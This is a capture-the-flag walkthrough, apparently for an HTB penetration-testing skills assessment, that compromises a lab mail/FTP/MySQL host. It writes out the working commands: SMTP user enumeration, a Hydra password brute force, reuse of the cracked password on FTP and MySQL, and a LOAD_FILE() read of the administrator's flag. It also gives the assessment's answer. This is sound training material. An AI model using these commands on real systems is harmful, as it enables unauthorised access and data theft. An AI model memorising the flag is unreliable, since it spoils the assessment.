### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - Skills Assessment Easy <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking Common Services - Easy

Inlanefreight contracted us for a pentest against three hosts. Each server has a flag (`HTB{...}`). The first server manages emails, customers, and files.

---

### Question 1:
You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.

IP: 10.129.203.7

#### Wide TCP scan + script + version + OS.

```diff
+ $ sudo nmap -sT -sC -sV -v -p 1-9999 -A 10.129.203.7
```

	21/tcp   open  ftp      Core FTP Server Version 2.0, build 725
	25/tcp   open  smtp     hMailServer smtpd
	80/tcp   open  http     Apache/2.4.53 (XAMPP)
	443/tcp  open  https    Core FTP HTTPS Server
	587/tcp  open  smtp     hMailServer smtpd
	3306/tcp open  mysql    MariaDB 10.4.24
	3389/tcp open  ms-wbt   MS Terminal Services

#### Note: CoreFTP build 725 has [CVE-2022-22836](https://www.exploit-db.com/exploits/50652) (auth required). SMTP looks open for enumeration.

```diff
+ $ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7
```

	10.129.203.7: fiona@inlanefreight.htb exists

#### Hydra against SMTP with rockyou:

```diff
+ $ hydra -l 'fiona@inlanefreight.htb' -P rockyou.txt 10.129.203.7 smtp -s 25 -f -V
```

	[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321

#### FTP auth worked with the same password - pulled notes:

```diff
+ $ ftp 10.129.203.7
+ ftp> get docs.txt
+ ftp> get WebServersInfo.txt
```

	CoreFTP:
	Directory C:\CoreFTP
	Ports: 21 & 443
	Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

#### Confirm FTP-over-HTTPS (`-k` for self-signed cert, `-H` overrides Host header):

```diff
+ $ curl -k -H "Host: localhost" --basic -u fiona:987654321 https://10.129.203.7/docs.txt
```

#### Try MySQL with the same creds - no SSL:

```diff
+ $ mysql -u fiona -p987654321 --ssl=0 -h 10.129.203.7
```

#### Check the file privilege bit:

```diff
+ MariaDB [(none)]> show variables like 'secure_file_priv';
```

	+------------------+-------+
	| Variable_name    | Value |
	+------------------+-------+
	| secure_file_priv |       |
	+------------------+-------+

#### Empty value -> `LOAD_FILE()` allowed. Read the admin desktop directly:

```diff
+ MariaDB [phpmyadmin]> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
```

	HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}

&#x1F6A9; found **HTB{t#3r3_4r3_tw0_w4y$--edit--_t0_93t_t#3_fl49}**.
